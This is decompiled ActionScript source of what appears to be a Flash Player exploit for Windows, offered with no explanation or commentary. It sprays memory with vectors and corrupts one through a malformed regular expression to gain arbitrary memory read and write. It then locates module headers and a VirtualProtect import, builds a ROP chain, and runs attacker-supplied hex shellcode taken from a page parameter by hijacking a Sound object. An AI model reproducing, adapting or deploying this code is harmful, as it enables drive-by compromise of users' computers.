package 
{
    import flash.display.Sprite;
    import flash.media.Sound;
    import flash.utils.ByteArray;
    import __AS3__.vec.Vector;
    import flash.display.LoaderInfo;
    import flash.system.Capabilities;
    import flash.utils.Endian;
    import __AS3__.vec.*;
    import flash.utils.*;
    import flash.display.*;
    import flash.media.*;
    import flash.system.*;
    import flash.external.*;
    import flash.net.*;

    public class pia extends Sprite 
    {
        public var pup:Number;
        public var voe:Sound;
        public var lac:ByteArray;
        public var elm:Vector.<Object>;
        public var oxo:uint;
        public var ser:Vector.<Number>;
        public var had:uint;
        public var lax:uint;
        public var sex:uint;
        public var cwm:uint;
        public var lacAddr:uint;
        public var pac:uint;
        public var bun:uint;
        public var fon:uint;
        public var ado:uint;
        public var aal:uint;
        public var jin:Vector.<uint>;

        public function pia():void
        {
            this.voe = new Sound();
            this.lac = new ByteArray();
            this.elm = new Vector.<Object>(0);
            this.jin = new Vector.<uint>(2);
            super();
            var _local_1:LoaderInfo = LoaderInfo(this.root.loaderInfo);
            var _local_2:String = ((_local_1.parameters.hasOwnProperty("his")) ? _local_1.parameters["his"] : null);
            if (_local_2 == null){
                return;
            };
            if (!this.arm()){
                return;
            };
            this.nod(_local_2);
            this.tab();
        }
        public function arm():Boolean
        {
            var _local_1:* = Capabilities.version.toLowerCase().split(" ");
            if (_local_1[0] != "win"){
                return (false);
            };
            this.pup = Number(_local_1[1].substr(0, 4).split(",").join(""));
            if ((((this.pup < 110)) && ((this.pup > 115)))){
                return (false);
            };
            return (true);
        }
        public function spy():RegExp
        {
            var _local_1:uint;
            var _local_2:Vector.<Object>;
            _local_1 = 0;
            while (_local_1 < 0x4000) {
                _local_2 = new Vector.<Object>(16);
                _local_2[0] = new RegExp("sdfhefbwjghfewtyfnwgvwgbvhwasfgsvrtvcrgeeg", "");
                _local_2[1] = this.las();
                _local_2[2] = this.las();
                _local_2[3] = this.las();
                _local_2[4] = this.las();
                _local_2[5] = this.las();
                _local_2[6] = this.las();
                _local_2[7] = this.las();
                _local_2[8] = this.las();
                _local_2[9] = this.dim();
                _local_2[10] = this.dim();
                _local_2[11] = this.dim();
                _local_2[12] = this.dim();
                _local_2[13] = this.dim();
                _local_2[14] = this.dim();
                _local_2[15] = this.dim();
                this.elm[_local_1] = _local_2;
                _local_1++;
            };
            _local_1 = 0x2000;
            while (_local_1 < 16383) {
                if ((_local_1 % 2) != 0){
                    this.elm[_local_1][2] = null;
                };
                _local_1++;
            };
            return (new RegExp("(?i)()()(?-i)||||||||||||||||||||||", ""));
        }
        public function mat():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:Vector.<Number>;
            var _local_4:Number;
            _local_1 = 0;
            _loop_1:
            while (_local_1 < 0x4000) {
                _local_2 = 1;
                while (_local_2 < 9) {
                    try {
                        if ((this.elm[_local_1][_local_2] as Vector.<Number>).length > 17){
                            _local_3 = (this.elm[_local_1][_local_2] as Vector.<Number>);
                            if (this.cel(_local_3, 17)[0] == 16) break _loop_1;
                            return (false);
                        };
                    } catch(e:Error) {
                    };
                    _local_2++;
                };
                _local_1++;
            };
            if (_local_3){
                this.oxo = this.cel(_local_3, 17)[1];
                _local_3[17] = this.zee(0xFFFFFFFE, this.oxo);
                _local_4 = (_local_3[18] = this.zee(0x41414141, 0));
                _local_1 = 0;
                while (_local_1 < 0x4000) {
                    _local_2 = 1;
                    while (_local_2 < 9) {
                        try {
                            if ((this.elm[_local_1][_local_2] as Vector.<Number>)[0] == _local_4){
                                this.ser = (this.elm[_local_1][_local_2] as Vector.<Number>);
                                this.ser[536870893] = this.zee(16, this.oxo);
                                return (true);
                            };
                        } catch(e:Error) {
                        };
                        _local_2++;
                    };
                    _local_1++;
                };
            };
            return (false);
        }
        public function tab():void
        {
            try {
                if (((this.ser) && (this.oxo))){
                    if (((this.lax) && (this.sex))){
                        this.eel(this.lax, this.sex, this.cwm);
                    };
                    this.ser[536870911] = this.zee(16, this.oxo);
                    return;
                };
            } catch(e:Error) {
            };
            do  {
            } while (1);
        }
        public function veg():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:Vector.<uint>;
            var _local_4:Vector.<uint>;
            try {
                _local_1 = 0;
                while (_local_1 < 0x4000) {
                    _local_2 = 1;
                    while (_local_2 < 9) {
                        if (this.elm[_local_1][_local_2] != this.ser){
                            this.elm[_local_1][_local_2] = null;
                        };
                        _local_2++;
                    };
                    _local_1++;
                };
                _local_1 = 1;
                while (_local_1 < 4) {
                    _local_3 = this.cel(this.ser, ((17 * _local_1) + (_local_1 - 1)));
                    _local_4 = this.cel(this.ser, ((17 * (_local_1 + 1)) + _local_1));
                    if ((((((((((_local_3[1] == this.oxo)) && ((_local_4[1] == this.oxo)))) && ((_local_3[1] < _local_3[0])))) && ((_local_4[1] < _local_4[0])))) && (((_local_4[0] - _local_3[0]) == 144)))){
                        this.had = (_local_3[0] - (144 * (_local_1 + 1)));
                        return (true);
                    };
                    _local_1++;
                };
            } catch(e:Error) {
            };
            return (false);
        }
        public function pay():Boolean
        {
            var _local_1:Number;
            var _local_2:uint;
            var _local_3:Vector.<uint>;
            var _local_4:uint;
            try {
                _local_1 = this.zee(1, 1);
                _local_2 = 0;
                while (_local_2 < 0x1000) {
                    if ((((this.cel(this.ser, _local_2)[1] == 32)) && ((this.ser[(_local_2 + 1)] == _local_1)))){
                        _local_3 = this.cel(this.ser, (_local_2 + 2));
                        this.lax = (_local_3[0] & 0xFFFFFFF8);
                        this.sex = this.tye(this.lax);
                        this.cwm = this.tye((this.lax + 4));
                        _local_4 = (_local_3[1] & 0xFFFFFFF8);
                        if (this.pup < 114){
                            this.lacAddr = this.tye((_local_4 + 56));
                        } else {
                            _local_4 = this.tye((_local_4 + 64));
                            this.lacAddr = this.tye((_local_4 + 8));
                        };
                        return (true);
                    };
                    _local_2++;
                };
            } catch(e:Error) {
            };
            return (false);
        }
        public function tye(_arg_1:uint):uint
        {
            var _local_2:uint = ((((_arg_1 % 8) == 0)) ? 0 : 1);
            if (_local_2){
                _arg_1 = (_arg_1 - 4);
            };
            if (this.aal == _arg_1){
                return (this.jin[_local_2]);
            };
            var _local_3:uint = (((_arg_1 - this.had) - 8) / 8);
            this.aal = _arg_1;
            this.jin = this.cel(this.ser, _local_3);
            return (this.jin[_local_2]);
        }
        public function eel(_arg_1:uint, _arg_2:uint, _arg_3:uint):void
        {
            var _local_4:uint = (((_arg_1 - this.had) - 8) / 8);
            this.ser[_local_4] = this.zee(_arg_2, _arg_3);
        }
        public function huh():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:uint;
            try {
                _local_2 = this.tye(0x7FFE0300);
                if (_local_2 == 0){
                    _local_2 = this.tye(2147353408);
                };
                if (_local_2){
                    _local_2 = (_local_2 & 0xFFFF0000);
                    while (1) {
                        if ((this.tye(_local_2) & 0xFFFF) == 23117){
                            _local_1 = _local_2;
                            break;
                        };
                        _local_2 = (_local_2 - 65536);
                    };
                    if (_local_1){
                        _local_3 = (_local_1 + this.tye((_local_1 + 60)));
                        if (this.tye(_local_3) == 17744){
                            this.pac = _local_1;
                            this.bun = _local_3;
                            return (true);
                        };
                    };
                };
            } catch(e:Error) {
            };
            return (false);
        }
        public function fed(_arg_1:uint, _arg_2:uint, _arg_3:uint):uint
        {
            var _local_4:uint = (_arg_1 >>> (8 * _arg_3));
            var _local_5:uint = (((_arg_3 == 0)) ? 0 : (_arg_2 << ((4 - _arg_3) * 8)));
            return ((_local_5 | _local_4));
        }
        public function oca():Boolean
        {
            var _local_1:uint;
            var _local_2:uint;
            var _local_3:uint;
            var _local_4:uint;
            var _local_5:uint;
            var _local_6:uint;
            try {
                _local_1 = this.tye((this.bun + 28));
                _local_2 = this.tye((this.bun + 44));
                if (((_local_1) && (_local_2))){
                    _local_2 = (_local_2 + this.pac);
                    _local_3 = this.tye(_local_2);
                    _local_4 = 4;
                    while (_local_4 < _local_1) {
                        _local_5 = this.tye((_local_2 + _local_4));
                        _local_6 = 0;
                        while (_local_6 < 4) {
                            if ((this.fed(_local_3, _local_5, _local_6) & 0xFFFF) == 50068){
                                this.fon = (((_local_2 + _local_4) - 4) + _local_6);
                                return (true);
                            };
                            _local_6++;
                        };
                        _local_3 = _local_5;
                        _local_4 = (_local_4 + 4);
                    };
                };
            } catch(e:Error) {
            };
            return (false);
        }
        public function jay(_arg_1:uint, _arg_2:Vector.<uint>, _arg_3:uint):Boolean
        {
            var _local_6:uint;
            var _local_4:uint = this.tye(_arg_1);
            var _local_5:uint;
            while (_local_5 < _arg_2.length) {
                _local_6 = this.tye((_arg_1 + ((_local_5 + 1) * 4)));
                if (this.fed(_local_4, _local_6, _arg_3) != _arg_2[_local_5]){
                    return (false);
                };
                _local_4 = _local_6;
                _local_5++;
            };
            return (true);
        }
        public function son():Boolean
        {
            var _local_1:uint;
            var _local_2:Vector.<uint>;
            var _local_3:uint;
            var _local_4:uint;
            var _local_5:uint;
            var _local_6:uint;
            var _local_7:uint;
            var _local_8:uint;
            var _local_9:uint;
            var _local_10:uint;
            try {
                _local_1 = this.tye((this.bun + 120));
                if (_local_1){
                    _local_1 = (_local_1 + this.pac);
                    _local_2 = new <uint>[1917876058, 1667593327, 1919506036];
                    _local_3 = this.tye((_local_1 + 24));
                    _local_4 = this.tye((_local_1 + 28));
                    _local_5 = this.tye((_local_1 + 32));
                    _local_6 = this.tye((_local_1 + 36));
                    if (((((((_local_3) && (_local_4))) && (_local_5))) && (_local_6))){
                        _local_4 = (_local_4 + this.pac);
                        _local_5 = (_local_5 + this.pac);
                        _local_6 = (_local_6 + this.pac);
                        _local_7 = 0;
                        while (_local_7 < _local_3) {
                            _local_8 = this.tye((_local_5 + (_local_7 * 4)));
                            if (_local_8){
                                _local_8 = (_local_8 + this.pac);
                                _local_9 = (_local_8 % 4);
                                _local_8 = (_local_8 - _local_9);
                                if (this.jay(_local_8, _local_2, _local_9)){
                                    _local_10 = this.tye((_local_6 + ((_local_7 / 2) * 4)));
                                    if ((_local_7 % 2)){
                                        _local_10 = (_local_10 >>> 16);
                                    };
                                    this.ado = (this.pac + this.tye((_local_4 + ((_local_10 & 0xFFFF) * 4))));
                                    return (true);
                                };
                            };
                            _local_7++;
                        };
                    };
                };
            } catch(e:Error) {
            };
            return (false);
        }
        public function nod(_arg_1:String):void
        {
            var _local_2:* = this.spy();
            if (!this.mat()){
                return;
            };
            if (!this.veg()){
                return;
            };
            if (!this.huh()){
                return;
            };
            if (!this.oca()){
                return;
            };
            if (!this.son()){
                return;
            };
            var _local_3:uint;
            while (_local_3 < 102400) {
                this.lac.writeUnsignedInt(1094861636);
                _local_3++;
            };
            this.lac.endian = Endian.LITTLE_ENDIAN;
            var _local_4:uint = this.lac.position;
            this.lac.position = (_local_4 + 136);
            this.kir(this.lac, _arg_1);
            this.lac.position = (_local_4 + 112);
            this.lac.writeUnsignedInt(this.fon);
            if (!this.pay()){
                return;
            };
            this.lacAddr = (this.lacAddr + _local_4);
            this.lac.position = _local_4;
            this.lac.writeUnsignedInt(this.ado);
            this.lac.writeUnsignedInt((this.lacAddr + 136));
            this.lac.writeUnsignedInt(0xFFFFFFFF);
            this.lac.writeUnsignedInt((this.lacAddr + 28));
            this.lac.writeUnsignedInt((this.lacAddr + 32));
            this.lac.writeUnsignedInt(64);
            this.lac.writeUnsignedInt((this.lacAddr + 36));
            this.lac.writeUnsignedInt(this.lacAddr);
            this.lac.writeUnsignedInt(0x1000);
            this.lac.writeUnsignedInt(1094861636);
            this.eel(this.lax, this.lacAddr, this.cwm);
            new Number(this.voe.toString());
        }
        private function kir(_arg_1:ByteArray, _arg_2:String):void
        {
            var _local_4:String;
            var _local_5:int;
            var _local_3:int;
            while (_local_3 < _arg_2.length) {
                _local_4 = _arg_2.substr(_local_3, 2);
                _local_5 = parseInt(_local_4, 16);
                _arg_1.writeByte(_local_5);
                _local_3 = (_local_3 + 2);
            };
        }
        private function zee(_arg_1:uint, _arg_2:uint):Number
        {
            var _local_3:ByteArray = new ByteArray();
            _local_3.endian = Endian.LITTLE_ENDIAN;
            _local_3.writeInt(_arg_1);
            _local_3.writeInt(_arg_2);
            _local_3.position = 0;
            return (_local_3.readDouble());
        }
        private function cel(_arg_1:Vector.<Number>, _arg_2:uint):Vector.<uint>
        {
            var _local_3:ByteArray = new ByteArray();
            _local_3.endian = Endian.BIG_ENDIAN;
            _local_3.writeDouble(_arg_1[_arg_2]);
            var _local_4:Vector.<uint> = new Vector.<uint>(2);
            _local_3.position = 0;
            _local_4[1] = _local_3.readUnsignedInt();
            _local_4[0] = _local_3.readUnsignedInt();
            return (_local_4);
        }
        private function dim():Vector.<Object>
        {
            var _local_1:* = new Vector.<Object>(32);
            _local_1[0] = null;
            _local_1[1] = null;
            _local_1[2] = this.voe;
            _local_1[3] = this.lac;
            return (_local_1);
        }
        private function las():Vector.<Number>
        {
            var _local_1:* = new Vector.<Number>(16);
            _local_1[0] = 0;
            _local_1[15] = 1;
            return (_local_1);
        }
    }
}
